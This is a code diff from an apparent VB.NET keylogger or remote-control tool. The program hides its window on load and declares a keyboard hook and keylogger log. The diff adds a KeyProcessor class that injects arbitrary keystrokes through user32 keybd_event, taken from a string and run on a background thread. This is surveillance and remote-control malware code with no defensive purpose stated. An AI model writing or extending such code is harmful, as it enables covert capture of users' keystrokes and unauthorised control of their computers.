@@ -3,13 +3,9 @@ Public Class Main
     Dim threadkeylogger As Threading.Thread
     Dim keyloggerLog As String = Nothing
     Dim isLoggin As Boolean = False
-
     Private WithEvents kbHook As KeyboardHook
-    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
+    Private WithEvents KeyProc As KeyProcessor
     Dim KeyloggerSwitch As Boolean = False
-    <DllImport("user32.dll")>
-    Shared Function GetAsyncKeyState(ByVal vKey As System.Windows.Forms.Keys) As Short
-    End Function
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
@@ -100,7 +96,15 @@ Public Class Main
             'Console.WriteLine(key)
         End If
     End Sub
-
+    Sub StartKeyProc(ByVal theString As String)
+        Try
+            KeyProc = New KeyProcessor
+            Dim threadKeyProc As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf KeyProc.ProcesarTeclas))
+            threadKeyProc.Start(theString.TrimEnd)
+        Catch ex As Exception
+            AddToLog("StartKeyProc@Main", "Error: " & ex.Message, True)
+        End Try
+    End Sub
     Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
         Try
             If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
@@ -116,6 +120,28 @@ Public Class Main
             End If
         Catch ex As Exception
             AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+End Class
+Public Class KeyProcessor
+    Public Event KeyDown(ByVal Key As Keys)
+    Public Event KeyUp(ByVal Key As Keys)
+    Public Sub New()
+    End Sub
+    <DllImport("user32.dll")>
+    Public Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
+    End Sub
+    Sub ProcesarTeclas(ByVal listaTeclas As String)
+        Try
+            Const KEYEVENTF_KEYUP = &H2
+            For Each ky As String In listaTeclas.Split(" ")
+                Dim Key As Keys = [Enum].Parse(GetType(Keys), ky, True)
+                keybd_event(Key, 0, 0, 0)
+                keybd_event(Key, 0, KEYEVENTF_KEYUP, 0)
+                Threading.Thread.Sleep(500)
+            Next
+        Catch ex As Exception
+            AddToLog("ProcesarTeclas@KeyProcessor", "Error: " & ex.Message, True)
         End Try
     End Sub
 End Class
